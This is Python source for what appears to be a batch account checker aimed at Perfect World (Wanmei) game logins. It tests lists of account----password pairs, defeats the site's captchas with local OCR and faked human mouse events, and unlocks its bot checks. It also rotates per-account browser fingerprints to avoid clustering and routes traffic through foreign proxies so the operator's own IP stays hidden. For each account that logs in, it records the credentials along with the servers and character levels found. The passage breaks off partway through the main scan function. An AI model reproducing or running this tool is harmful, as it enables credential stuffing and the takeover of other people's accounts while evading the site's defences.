# -*- coding: utf-8 -*-
"""
wm_scan.py -- 完美世界「查区查等级」批量扫号工具（生产版）
================================================================
替代原「角色查询-诛仙.exe」的卡密账号来源，改为读本地账号文件。

输入  accounts.txt，每行一条，格式二选一：
    账号----密码
    账号,密码
    (# 开头或空行忽略；行尾可跟 ----备注 原样带回)

输出  result.txt，与原软件同格式：
    账号----密码----[区服1----等级----等级…----[区服2----等级…
    （无角色的账号输出 账号----密码----无角色）

配套：
    progress.jsonl  断点续跑（每账号一行，已完成的跳过）
    fail.csv        失败分诊（账号,原因,时间）
    scan.log        运行日志

用法：
    python wm_scan.py accounts.txt --out result.txt --game 1
    python wm_scan.py accounts.txt --limit 10 --delay 6      # 先小批量试
    python wm_scan.py accounts.txt --resume                  # 续跑（默认就是续跑）

依赖：识别端目录里必须有 32 位 vcomp140.dll（见 ocr_service.py）
"""
import argparse, base64, csv, io, json, os, random, re, sys, threading, time
from concurrent.futures import ThreadPoolExecutor

import netguard  # noqa: F401
import requests
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)


def _workdir():
    """打包成 exe 后，__file__ 在临时目录里；日志/进度必须写到固定位置，
    否则每次启动都是新的临时目录，断点续跑直接失效。"""
    try:
        import app_config
        return app_config.WORK_DIR
    except Exception:
        return HERE


WORK_DIR = _workdir()
from wmcaptcha import (PROXIES, UA, PASSPORT, CAPTCHAS, enc_key, aes_encrypt_b64,
                       build_fp, gen_human_events, FINGERPRINT_PROFILES, strip_jsonp)
from solve_pick_text import local_ocr, coords_to_validate, cb
import ocr_service
import servers as SRV
import proxy_pool


def _px():
    """当前线程该用的代理（代理池按账号绑定；没绑就用默认 iKuuu）"""
    return proxy_pool.proxies_for()

LOGIN_URL = f"{PASSPORT}/sso/login?service=passport&isiframe=1&location=2f736166652f"
SUBMIT_URL = f"{PASSPORT}/sso/login"
STATUS_URL = f"{PASSPORT}/sso/loginstatus"
EP_ROLE = "https://event.games.wanmei.com/server/list/getRoleListByServerJsonp"
VG = "https://vanguard.wanmei.com"
FALLBACK_PUBKEY = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxXpK8ojMvJqcQiiLhJRBUoAvkehP"
    "54FjknCgyxqAWbprmBHuREoh3rqTZbqBanvcftqnzAMSBnMy/MH2t2iVI/+02BlSGoKHDjH"
    "WPFgj+6XaNyt2TLo5XDi/vl7T4F1oF6n3eNy5lckOUK2N3lUyRK1bREhzbIodMmKxyQa6V5"
    "iC9kmVSrgRLzqEAG77Nlk+6C+HDEusVldBWkyf1Av/lceEXm0T1MHzuScraqm8Fa+qb+TSY"
    "KUl/mOUzU/PlKLBfKqwDOAUrJqKkCwi7NyVoyWTFVHFdoy3oSw9bQKXO2TyzNg3A92RaPrt"
    "+4/XjoAbCQFpINoElCd7tWWO1g/VywIDAQAB")

BROWSER_H = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9", "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
    "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
}
AJAX_H = {**BROWSER_H, "Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
          "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin"}
ROLE_H = {**BROWSER_H, "Accept": "*/*", "Referer": "https://zhuxian.wanmei.com/",
          "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors",
          "Sec-Fetch-Site": "same-site"}

_logf = None
LOG_SINK = None                  # GUI 注入：每条日志都会回调这里
STOP_EVENT = threading.Event()   # GUI 注入：置位后停止扫描


def log(s=""):
    s = str(s)
    try:
        print(s, flush=True)      # 打包成 exe（无控制台）时 stdout 是 None
    except Exception:
        pass
    if _logf:
        _logf.write(s + "\n"); _logf.flush()
    if LOG_SINK:
        try:
            LOG_SINK(s)
        except Exception:
            pass


def unwrap(text):
    t = text.strip()
    if t.startswith("/**/"):
        t = t[4:]
    if "(" in t and t.rstrip().endswith((")", ");")):
        i, j = t.find("("), t.rfind(")")
        if j > i:
            t = t[i + 1:j].strip()
    if len(t) >= 2 and t[0] == "'" and t[-1] == "'":
        t = t[1:-1].strip()
    return t


def get(sess, url, tries=3, **kw):
    kw.setdefault("headers", BROWSER_H)
    last = None
    for a in range(tries):
        try:
            return sess.get(url, proxies=_px(), timeout=30, **kw)
        except Exception as e:
            last = e
            time.sleep(1.5 + a * 2)
    raise last


def post(sess, url, **kw):
    last = None
    for a in range(3):
        try:
            return sess.post(url, proxies=_px(), timeout=40, **kw)
        except Exception as e:
            last = e
            time.sleep(1.5 + a * 2)
    raise last


# ================================================================ 验证码
def solve_wm_captcha(sess, app_id, cap_ticket, fp, max_tries=5):
    for _ in range(max_tries):
        kt = enc_key(cap_ticket)
        ev = gen_human_events(seed=random.randint(1, 10 ** 9))
        op = aes_encrypt_b64(json.dumps(ev, separators=(",", ":")), kt)
        ft = json.loads(unwrap(get(
            sess, f"{CAPTCHAS}/aicaptcha/firstTest",
            params={"callback": cb(), "appId": app_id, "capTicket": cap_ticket,
                    "mobile": 0, "op": op, "fp": fp, "isInIframe": "false",
                    "_": int(time.time() * 1000)},
            headers={**AJAX_H, "Referer": LOGIN_URL}).text))
        if not ft.get("next"):
            return ft.get("secCode")

        gc = json.loads(unwrap(get(
            sess, f"{CAPTCHAS}/aicaptcha/getCaptcha",
            params={"callback": cb(), "appId": app_id, "capTicket": cap_ticket,
                    "_": int(time.time() * 1000)},
            headers={**AJAX_H, "Referer": LOGIN_URL}).text))
        if gc.get("code") != 0:
            continue
        img = get(sess, gc["imgUrl"], headers={"User-Agent": UA}).content
        t0 = time.time()
        resp = local_ocr(img)
        ms = int((time.time() - t0) * 1000)
        validate, pts = coords_to_validate(resp)
        if not pts:
            time.sleep(1.0); continue

        kk = enc_key(gc["capKey"])
        st = json.loads(unwrap(get(
            sess, gc["validateUrl"],
            params={"callback": cb(), "appId": app_id, "capTicket": cap_ticket,
                    "capKey": gc["capKey"],
                    "validData": aes_encrypt_b64(json.dumps(
                        {"validate": validate, "time": max(1800, ms + 1200)},
                        separators=(",", ":")), kk),
                    "op": aes_encrypt_b64(json.dumps(ev, separators=(",", ":")), kk),
                    "fp": fp, "isInIframe": "false", "_": int(time.time() * 1000)},
            headers={**AJAX_H, "Referer": LOGIN_URL}).text))
        if st.get("code") == 0 and st.get("result"):
            return st["result"]
        time.sleep(1.0)
    return None


# ================================================================ 登录
def login(user, password, fp):
    """返回 (ok, sess, verdict)。

    ★ 任何网络类异常都返回 NET:* —— 这是**可重跑**的状态，
      不该像密码错那样把账号判死。
    """
    try:
        return _login_inner(user, password, fp)
    except Exception as e:
        return False, None, f"NET:{type(e).__name__}"


def _login_inner(user, password, fp):
    sess = requests.Session(); sess.trust_env = False
    try:
        r = get(sess, LOGIN_URL, headers=BROWSER_H)
    except Exception as e:
        return False, None, f"NET:{type(e).__name__}"
    m = re.search(r'id="e"[^>]*value="([^"]+)"', r.text)
    pubkey = m.group(1) if m else FALLBACK_PUBKEY

    need = json.loads(get(sess, f"{PASSPORT}/sso/servlet/ajax",
                          params={"op": "checkNeedRand", "username": user},
                          headers={**AJAX_H, "Referer": LOGIN_URL}).text).get("code")

    randimg, is_aicap, need_rand = "", "", str(need or 0)
    if need == 1:
        init = json.loads(get(sess, f"{PASSPORT}/sso/servlet/ajax",
                              params={"op": "mCaptchaInit", "isAICap": "1"},
                              headers={**AJAX_H, "Referer": LOGIN_URL}).text)
        if init.get("code") != 0:
            return False, None, "CAPTCHA_INIT_FAIL"
        sec = solve_wm_captcha(sess, init["data"]["appId"],
                               init["data"]["capTicket"], fp)
        if not sec:
            return False, None, "CAPTCHA_UNSOLVED"
        randimg = f"{init['data']['capTicket']};{sec}"
        is_aicap, need_rand = "1", "1"

    try:
        enc = base64.b64encode(PKCS1_v1_5.new(RSA.import_key(base64.b64decode(pubkey)))
                               .encrypt(password.encode())).decode()
    except Exception as e:
        return False, None, f"RSA:{type(e).__name__}"

    form = {"username": user, "password": enc, "e": pubkey, "continue": "",
            "service": "passport", "location": "2f736166652f", "needRand": need_rand,
            "isiframe": "1", "logintype": "normal", "CSSStyle": "", "autoLogin": "1",
            "randimg": randimg, "isAICap": is_aicap, "captchaVersion": "2",
            "readAndAgree": "1"}
    r = post(sess, SUBMIT_URL, data=form,
             headers={**BROWSER_H, "Referer": LOGIN_URL, "Origin": PASSPORT,
                      "Content-Type": "application/x-www-form-urlencoded"},
             allow_redirects=False)

    if r.status_code in (301, 302, 303, 307):
        loc = r.headers.get("Location", "")
        if loc:
            try:
                get(sess, loc, headers=BROWSER_H)
            except Exception:
                pass
        # SSO 跟完后 loginstatus 有时要隔一下才认，重试几次
        # ★ 用文档型头（不是 XHR 头）才认，实测过
        for _ in range(4):
            st = get(sess, STATUS_URL, headers={**BROWSER_H, "Referer": LOGIN_URL},
                     allow_redirects=False)
            if st.status_code == 200:
                return True, sess, "OK"
            time.sleep(1.2)
        # 兜底：只要拿到了 COOKIE_LOGIN，就交给后续查角色去判定成败
        names = {c.name for c in sess.cookies}
        if "COOKIE_LOGIN" in names:
            return True, sess, "OK_COOKIE_ONLY"
        return False, None, "SSO_INCOMPLETE"

    body = r.text
    for kw, v in (("用户名或密码错误", "BAD_CREDENTIAL"), ("不存在", "NO_SUCH_ACCOUNT"),
                  ("冻结", "ACCOUNT_FROZEN"), ("锁定", "ACCOUNT_LOCKED"),
                  ("验证码", "CAPTCHA_REJECTED"), ("频繁", "RATE_LIMITED")):
        if kw in body:
            return False, None, v
    return False, None, "LOGIN_FAILED"


# ================================================================ 查角色
def solve_vanguard(sess, redirect_url, fp):
    if redirect_url:
        try:
            get(sess, redirect_url,
                headers={"User-Agent": UA,
                         "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                         "Accept-Language": "zh-CN,zh;q=0.9",
                         "Referer": "https://zhuxian.wanmei.com/",
                         "Upgrade-Insecure-Requests": "1"})
        except Exception:
            pass
    try:
        rr = get(sess, f"{VG}/getCaptcha",
                 params={"captchaType": "WanmeiCaptcha", "rand": int(time.time() * 1000)},
                 headers={"User-Agent": UA,
                          "Accept": "application/json, text/javascript, */*; q=0.01",
                          "Accept-Language": "zh-CN,zh;q=0.9",
                          "Referer": redirect_url or f"{VG}/",
                          "X-Requested-With": "XMLHttpRequest"})
        d = rr.json()
    except Exception as e:
        log(f"      [vanguard] getCaptcha 异常 {type(e).__name__}: {str(e)[:70]}")
        return False
    if d.get("code") != 0:
        log(f"      [vanguard] getCaptcha 被拒: {str(d)[:120]}")
        return False
    sec = solve_wm_captcha(sess, d["result"]["appId"], d["result"]["capTicket"], fp)
    if not sec:
        log("      [vanguard] 验证码求解失败（5 次都没拿到 secCode）")
        return False
    try:
        v = get(sess, f"{VG}/validateCaptcha",
                params={"submitCaptchaValue": f"{d['result']['capTicket']};{sec}"},
                headers={"User-Agent": UA,
                         "Accept": "application/json, text/javascript, */*; q=0.01",
                         "Referer": redirect_url or f"{VG}/",
                         "X-Requested-With": "XMLHttpRequest"}).json()
    except Exception as e:
        log(f"      [vanguard] validateCaptcha 异常 {type(e).__name__}: {str(e)[:70]}")
        return False
    if v.get("code") != 0:
        log(f"      [vanguard] validateCaptcha 被拒: {str(v)[:140]}")
    return v.get("code") == 0


def query_roles(sess, game_id, server_id, fp, rounds=4):
    for _ in range(rounds):
        p = {"callback": "jQuery1830%d_%d" % (random.randint(10000, 99999),
                                              int(time.time() * 1000)),
             "key": int(time.time() * 1000), "gameId": str(game_id),
             "server": str(server_id), "client": "pc"}
        r = get(sess, EP_ROLE, params=p, headers=ROLE_H)
        body = r.text
        if "<!DOCTYPE" in body[:200] or body.lstrip().startswith("<"):
            m = re.search(r'name="location"\s+value="([^"]+)"', body)
            if m and solve_vanguard(sess, m.group(1), fp):
                continue
            return None
        try:
            d = json.loads(unwrap(body))
        except Exception:
            return None
        if d.get("code") == 100001:
            if solve_vanguard(sess, d.get("result", ""), fp):
                continue
            return None
        return d.get("roleList") or []
    return None


def _role_get(sess, game_id, server_id, tries=4):
    """发一次角色查询请求（网络抖动自动重试），返回响应对象"""
    p = {"callback": "jQuery1830%d_%d" % (random.randint(10000, 99999),
                                          int(time.time() * 1000)),
         "key": int(time.time() * 1000), "gameId": str(game_id),
         "server": str(server_id), "client": "pc"}
    last = None
    for a in range(tries):
        try:
            return sess.get(EP_ROLE, params=p, proxies=_px(),
                            headers=ROLE_H, timeout=25)
        except Exception as e:
            last = e
            if a < tries - 1:
                time.sleep(1.0 + a * 1.5)
    raise last


def _classify(body):
    """把一次响应分类：(kind, payload)
       kind: 'roles' / 'vg' / 'bad'"""
    if "<!DOCTYPE" in body[:200] or body.lstrip().startswith("<"):
        m = re.search(r'name="location"\s+value="([^"]+)"', body)
        return "vg", (m.group(1) if m else "")
    try:
        d = json.loads(unwrap(body))
    except Exception:
        return "bad", None
    if d.get("code") == 100001:
        return "vg", d.get("result", "")
    return "roles", d.get("roleList") or []


def _thread_session(master):
    """并发时共用同一个会话 —— 关键：Vanguard 解锁是绑会话的，
    如果每个线程各用一份会话，解锁了也对别的线程无效（实测：每轮只过 5 个）。"""
    return master


def sweep_servers(master, game_id, fp, workers=3, min_interval=0.45, verbose=True):
    """并发扫全部区服（共用会话 + 全局限速器 + Vanguard 自动解锁）。

    返回 found = {区服名: [等级, ...]}   —— 只包含**有角色**的区服（与原软件一致）
    """
    found = {}
    todo = list(SRV.SERVERS)
    total = len(todo)
    rate_lock = threading.Lock()
    last_at = [0.0]
    unlock_fail = 0

    def throttle():
        """全局限速：任意两次请求发出间隔不小于 min_interval"""
        with rate_lock:
            wait = last_at[0] + min_interval - time.time()
            if wait > 0:
                time.sleep(wait)
            last_at[0] = time.time()

    # ★ 把「这个账号绑定的代理」抓下来 —— ThreadPoolExecutor 起的是新线程，
    #   proxy_pool 用的是 thread-local，不显式带过去的话工作线程会退回默认出口，
    #   导致登录 IP 与查询 IP 不一致，Vanguard 会判「会话已失效」。
    _acct_proxy = proxy_pool.current_proxy()
    _last_report = [0]      # 上次报进度时的已扫区服数
    _vg_said = [False]      # 本轮是否已经报过「触发校验」

    for attempt in range(5):
        if not todo:
            break
        lock = threading.Lock()
        stop = threading.Event()
        retry, vg_box = [], []
        attempted = set()

        def work(sv):
            proxy_pool.set_thread_proxy(_acct_proxy)   # ★ 关键一行
            with lock:
                if stop.is_set():
                    return                    # 没轮到 → 不进 attempted，下一轮还要跑
                attempted.add(sv["server"])
            throttle()
            if stop.is_set():
                with lock:
                    attempted.discard(sv["server"])
                return
            try:
                r = _role_get(master, game_id, sv["server_id"])
            except Exception:
                with lock:
                    retry.append(sv)
                return
            kind, payload = _classify(r.text)
            if kind == "vg":
                stop.set()                      # ★ 一撞风控立刻收手，别再白打
                with lock:
                    if not vg_box:
                        vg_box.append(payload)
                    retry.append(sv)
                return
            if kind == "bad":
                with lock:
                    retry.append(sv)
                return
            levels = [v.get("level") for v in payload
                      if v.get("roleId") not in (0, None)]
            with lock:
                if levels:
                    found[sv["server"]] = levels

        with ThreadPoolExecutor(max_workers=workers) as ex:
            list(ex.map(work, todo))

        # ★ 本轮「压根没轮到」的必须留着，别丢
        pending = [sv for sv in todo if sv["server"] not in attempted]
        # ★ 不再每轮都打：每扫过约 15 个区服才报一次进度，
        #   否则 53 个区服会刷出上百行，把真正的结果淹没
        scanned = total - len(pending)
        if verbose and (scanned - _last_report[0] >= 15 or not pending):
            _last_report[0] = scanned
            log(f"    扫描进度 {scanned}/{total} 区服"
                f"（命中 {len(found)}，待重试 {len(retry)}）")
        todo = pending + retry
        if todo and vg_box:
            if verbose and not _vg_said[0]:
                _vg_said[0] = True
                log("    触发机器人校验，正在自动解锁 …")
            time.sleep(1.0)
            ok_unlock = False
            for t in range(3):                      # ★ 解锁本身也重试
                if solve_vanguard(master, vg_box[0], fp):
                    ok_unlock = True
                    break
                if verbose:
                    log(f"    [vanguard] 第 {t+1}/3 次解锁失败，重试 ...")
                time.sleep(2 + t * 2)
            if not ok_unlock:
                unlock_fail += 1
                if unlock_fail >= 2:
                    if verbose:
                        log("    [vanguard] 连续解锁失败 → 本轮放弃（结果标记为不完整）")
                    break
                time.sleep(3)
            time.sleep(0.8)
        elif todo:
            time.sleep(1.5)          # 网络抖动，缓一下重试

    # ★ 只有「一个区服都不剩」才算查全；否则必须让上层知道结果不完整
    return found, (len(todo) == 0)


# ================================================================ 游戏识别
# 官方 server_rolelist_jsonp.js 的 gameProperties + 中文名对照
GAME_NAME_MAP = [
    ("完美世界经典服", 1), ("完美世界", 1), ("world2", 1),
    ("诛仙2", 11), ("诛仙", 11), ("zhuxian2", 11),
    ("完美国际", 10), ("w2i", 10),
    ("梦幻诛仙", 15), ("mhzx2", 15),
    ("武林外传", 9), ("笑傲江湖", 23), ("赤壁", 12),
    ("神鬼传奇", 18), ("神鬼世界", 25), ("神魔大陆", 19),
]
ALL_GAME_IDS = [1, 11, 10, 15]


def game_id_of(name):
    for k, v in GAME_NAME_MAP:
        if k in name:
            return v
    return None


def detect_games(sess, verbose=True):
    """用「登录记录查询」页识别这个账号玩过哪些游戏。

    页面结构（实测）：
        <ul><li class="headli">...</li>
            <li><span>完美世界</span><span>2026-08-30 21:28:48</span><span>完美世界</span></li>
            ...
    返回 [(gameId, 游戏名), ...]；识别不出返回 []
    """
    try:
        r = get(sess, f"{PASSPORT}/nicknameAction.do?method=getLastServer",
                headers={**BROWSER_H, "Referer": f"{PASSPORT}/"})
    except Exception:
        return []
    if r.status_code != 200:
        return []
    games, seen = [], set()
    for m in re.finditer(r"<li[^>]*>(.*?)</li>", r.text, re.S | re.I):
        row = m.group(1)
        # 只认带时间戳的行 = 真正的记录行，避开导航栏
        if not re.search(r"\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}", row):
            continue
        sp = re.search(r"<span[^>]*>(.*?)</span>", row, re.S | re.I)
        if not sp:
            continue
        gname = re.sub(r"<[^>]+>", "", sp.group(1)).strip()
        gid = game_id_of(gname)
        if gid and gid not in seen:
            seen.add(gid)
            games.append((gid, gname))
    return games


# ---------------------------------------------------------------- 指纹随机化
_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
]
_SCREENS = ["1920x1080", "1536x864", "1600x900", "1440x900", "2560x1440", "1366x768", "1680x1050"]
_TZOFF = [-480, -480, -480, -480, -420]      # 中国 UTC+8 为主，少量邻近时区


def random_profile(rnd=None):
    """每个账号一套独立指纹 —— 反聚类用，绝不让 N 个账号共用同一个 fp 值"""
    rnd = rnd or random
    p = dict(FINGERPRINT_PROFILES[0])
    p["userAgent"] = rnd.choice(_UAS)
    p["screen"] = rnd.choice(_SCREENS)
    p["colorDepth"] = rnd.choice([24, 24, 32])
    p["tzOffset"] = rnd.choice(_TZOFF)
    # canvas 指纹：长度像真的即可，值必须每个账号不同
    p["canvas"] = ("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAYAAACGE6YQ"
                   "AAAAAXNSR0IArs4c6Q" +
                   base64.b64encode(bytes(rnd.getrandbits(8) for _ in range(120))).decode())
    return p


def scan_account(user, password, games, rate, workers=3, verbose=True):
    """games: 列表 = 指定 gameId；'auto' = 自动识别；'all' = 全试

    返回 (status, found, games_used)
    """
    fp = build_fp(random_profile())
    ok, sess, verdict = login(user, password, fp)
    if not ok:
        return verdict, None, None

    if games == "auto":
        det = detect_games(sess, verbose)
        if det:
            games = [g for g, _ in det]
            if verbose:
                log(f"   [识别] 玩过: {[n for _, n in det]}  -> gameId {games}")
        else:
            games = [1]                     # 认不出就先按最可能的试
            if verbose:
                log("   [识别] 登录记录里认不出游戏，先按 完美世界(gameId=1) 试")
    elif games == "all":
        games = list(ALL_GAME_IDS)
        if verbose:
            log(f"   [识别] 全试模式，gameId {games}")

    found = {}
    all_complete = True
    for gid in games:
        try:
            f, complete = sweep_servers(sess, gid, fp, workers=workers,
                                        min_interval=rate, verbose=verbose)
        except Exception as e:
            # 网络断了：已扫到的先留着，但这个账号标为不完整（可重跑）
            if verbose:
                log(f"   [网络] 扫描 {gid} 时异常 {type(e).__name__}: "
                    f"{str(e)[:70]}")
            all_complete = False
            continue
        for k, v in f.items():
            found[k] = v
        if not complete:
            all_complete = False
    if not all_complete:
        # ★ 结果不完整 → 绝不当成功写出去，标记为可重跑
        return "INCOMPLETE", found, games
    return ("OK" if found else "OK_NO_ROLE"), found, games


# ================================================================ 输出格式
# 区服输出顺序 = 原软件内嵌区服表的顺序（并发跑出来的 dict 顺序是乱的，必须重排）
_SERVER_ORDER = {sv["server"]: i for i, sv in enumerate(SRV.SERVERS)}


def format_line(account, password, found, note=""):
    """账号----密码----[区服1----等级----等级…----[区服2----…]

    与原「角色查询-诛仙.exe」输出逐字节对齐：
      · 含结尾的 ]
      · 区服按原软件区服表顺序排列（不是并发完成的顺序）
    """
    if not found:
        s = f"{account}----{password}----无角色"
    else:
        parts = [account, password]
        for sname in sorted(found, key=lambda x: _SERVER_ORDER.get(x, 9999)):
            parts.append("[" + sname)
            parts.extend(str(x) for x in found[sname])
        s = "----".join(parts) + "]"      # ★ 原软件有收尾 ]
    if note:
        s += "----" + note
    return s


def parse_line(line):
    line = line.lstrip("\ufeff").strip()
    if not line or line.startswith("#"):
        return None
    if "----" in line:
        seg = line.split("----")
        return seg[0].strip(), (seg[1].strip() if len(seg) > 1 else ""), \
               ("----".join(seg[2:]).strip() if len(seg) > 2 else "")
    if "," in line:
        a, b = line.split(",", 1)
        return a.strip(), b.strip(), ""
    return line, "", ""


def build_parser():
    ap = argparse.ArgumentParser()
    ap.add_argument("accounts")
    ap.add_argument("--out", default="result.txt")
    ap.add_argument("--game", default="auto",
                    help="auto=自动识别(默认) | all=全试 | 1=完美世界 | 11=诛仙2 | "
                         "10=完美国际 | 15=梦幻诛仙 | 也可写 1,11")
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--workers", type=int, default=3, help="账号内并发区服数（默认3）")
    ap.add_argument("--rate", type=float, default=0.8, help="两次请求最小间隔秒（实测 0.8 最优）")
    ap.add_argument("--parallel", type=int, default=2, help="★ 同时跑几个账号（实测 2 最优；3 会触发风控失败）")
    ap.add_argument("--acct-delay", type=float, default=3.0, help="账号之间错开的秒数")
    ap.add_argument("--retries", type=int, default=3,
                    help="账号级重试次数：网络类失败会换一条代理重跑（默认3）")
    ap.add_argument("--fresh", action="store_true", help="忽略进度，全部重跑")
    ap.add_argument("--no-egress-check", action="store_true",
                    help="跳过出口体检（不建议！）")
    ap.add_argument("--proxy-file", default=None,
                    help="多 IP 代理池文件（host:port:user:pass 每行一条）；不传则用单出口")
    ap.add_argument("--proxy-check", type=int, default=10,
                    help="代理池体检并发数（默认10）")
    return ap


def run_scan(args):
    """真正干活。GUI 直接构造 args 命名空间调用它。"""
    global _logf
    STOP_EVENT.clear()
    _logf = io.open(os.path.join(WORK_DIR, "scan.log"), "a", encoding="utf-8")
    log(f"\n===== {time.strftime('%Y-%m-%d %H:%M:%S')} 批次开始 =====")

    # ---- 0a) ★ 出口红线：绝不暴露本机(昆明)IP ----
    if not args.no_egress_check:
        try:
            import egress_guard
            egress_guard.preflight(verbose=True)
        except Exception as e:
            log(f"!! 出口体检不通过，拒绝开工：\n{e}")
            return 3

    # ---- 0b) 本地 OCR 服务 ----
    okv, msgv = ocr_service.check_vcomp()
    log(f"[前置] vcomp140: {okv}  {msgv}")
    if not okv:
        log("!! 缺 32 位 vcomp140.dll，服务起不来，终止"); return 1
    if not ocr_service.port_open():
        log("[前置] 拉起本地 OCR 服务 ...")
        try:
            ocr_service.start()
        except Exception as e:
            log(f"!! OCR 服务起不来: {e}"); return 1
    log("[前置] 本地 OCR 服务就绪 (127.0.0.1:506)")

    # ---- 0c) ★ 多 IP 代理池 ----
    pool = None
    if args.proxy_file:
        log(f"[代理池] 载入 {args.proxy_file} 并体检 ...")
        try:
            pool = proxy_pool.build(args.proxy_file, workers=args.proxy_check,
                                    verbose=True)
        except Exception as e:
            log(f"!! 代理池载入失败: {e}"); return 4
        st = pool.stats()
        log(f"[代理池] 可用 {st['good']}/{st['total']}  唯一出口IP {st['unique_ips']}  "
            f"中位延迟 {st['median_ms']}ms")
        if st["good"] < 2:
            log("!! 可用代理少于 2 条，终止"); return 4
        # ★ 红线：池里绝不能有国内出口
        cn = [e for e in pool.good if (e.get("cc") or "").upper() in ("CN", "CHINA")]
        if cn:
            log(f"!! 代理池里有 {len(cn)} 条国内出口 IP，拒绝开工："
                f"{[e['ip'] for e in cn[:5]]}")
            return 4
        if args.parallel > st["good"]:
            log(f"[代理池] 可用 {st['good']} 条，并行数 {args.parallel} -> {st['good']}")
            args.parallel = st["good"]
        log(f"[代理池] OK 全部境外出口，并行数 {args.parallel}")

    # ---- 1) 解析 --game ----
    g = args.game.strip().lower()
    if g in ("auto", "all"):
        games = g
    else:
        games = [int(x) for x in re.split(r"[,\s]+", g) if x.strip()]
    log(f"[参数] 游戏={games}  账号内并发={args.workers}  限速={args.rate}s  "
        f"账号并行={args.parallel}")

    # ---- 2) 读账号 ----
    accts = []
    for ln in io.open(args.accounts, encoding="utf-8-sig", errors="replace"):
        p = parse_line(ln)
        if p:
            accts.append(p)
    log(f"[输入] {len(accts)} 个账号")
    if args.limit:
        accts = accts[:args.limit]

    # ---- 3) 进度（断点续跑）----
    prog_path = os.path.join(WORK_DIR, "progress.jsonl")
    done = {}
    if not args.fresh and os.path.exists(prog_path):
        for ln in io.open(prog_path, encoding="utf-8-sig", errors="replace"):
            try:
                o = json.loads(ln)
                done[o["account"]] = o
            except Exception:
                pass
        log(f"[续跑] 已完成 {len(done)} 个")
    todo = [a for a in accts
            if not (a[0] in done and done[a[0]].get("status") in ("OK", "OK_NO_ROLE"))]
    log(f"[待跑] {len(todo)} 个（跳过已完成 {len(accts)-len(todo)} 个）")

    out = io.open(args.out, "a", encoding="utf-8")
    fail = io.open(os.path.join(WORK_DIR, "fail.csv"), "a", encoding="utf-8", newline="")
    fw = csv.writer(fail)
    if fail.tell() == 0:
        fw.writerow(["账号", "原因", "时间"])

    io_lock = threading.Lock()
    stat = {"ok": 0, "fail": 0}
    total = len(todo)
    t_start = time.time()

    def run_one(idx, item):
        user, pwd, note = item
        # ★ 账号级重试：网络类失败换一条代理再来
        #   确定性失败（密码错/账号不存在）不重试，重试也是浪费
        RETRYABLE = ("INCOMPLETE", "NET:", "EXC:Connection", "EXC:Timeout",
                     "EXC:SSLError", "EXC:ProxyError", "EXC:Chunked")
        NOT_RETRYABLE = ("BAD_CREDENTIAL", "NO_SUCH_ACCOUNT", "ACCOUNT_FROZEN",
                         "ACCOUNT_LOCKED", "GAME_UNKNOWN")

        status, found, gused, dt = "UNKNOWN", None, None, 0.0
        for attempt in range(1, max(2, args.retries + 1)):
            if STOP_EVENT.is_set():
                return
            ent = None
            if pool:
                ent = pool.acquire()
                if ent is None:
                    with io_lock:
                        log(f"[{idx}/{total}] 暂停 {user}  代理池暂无空闲，留待续跑")
                    return
                proxy_pool.set_thread_proxy(ent["url"])
                if ent.get("ip") and attempt == 1:
                    with io_lock:
                        log(f"[{idx}/{total}] {user}  出口 {ent['ip']} "
                            f"({ent.get('cc')}/{ent.get('city')}, {ent.get('ms')}ms)")
            t0 = time.time()
            try:
                status, found, gused = scan_account(user, pwd, games, args.rate,
                                                    workers=args.workers)
            except Exception as e:
                status, found, gused = f"EXC:{type(e).__name__}", None, None
            finally:
                if ent:
                    pool.release(ent)
                    proxy_pool.clear_thread_proxy()
            dt += time.time() - t0

            if status in ("OK", "OK_NO_ROLE"):
                break
            if any(k in status for k in NOT_RETRYABLE):
                break
            if any(k in status for k in RETRYABLE) and attempt < args.retries:
                with io_lock:
                    log(f"    [{user}] 第 {attempt} 次未完成（{status}），"
                        f"换代理重试 …")
                time.sleep(random.uniform(3, 7))
                continue
            break

        with io_lock:
            if status in ("OK", "OK_NO_ROLE"):
                line = format_line(user, pwd, found or {}, note)
                out.write(line + "\n"); out.flush()
                nrole = sum(len(v) for v in (found or {}).values())
                log(f"[{idx}/{total}] ✓ 成功  {user}   "
                    f"{len(found or {})} 区服 / {nrole} 角色   {dt:.0f} 秒")
                log(f"      → {line[:170]}")
                stat["ok"] += 1
            else:
                _why = {"INCOMPLETE": "网络不稳，可重跑",
                        "BAD_CREDENTIAL": "密码错误",
                        "NO_SUCH_ACCOUNT": "账号不存在",
                        "ACCOUNT_FROZEN": "账号被封",
                        "ACCOUNT_LOCKED": "账号被锁"}.get(
                            status, status)
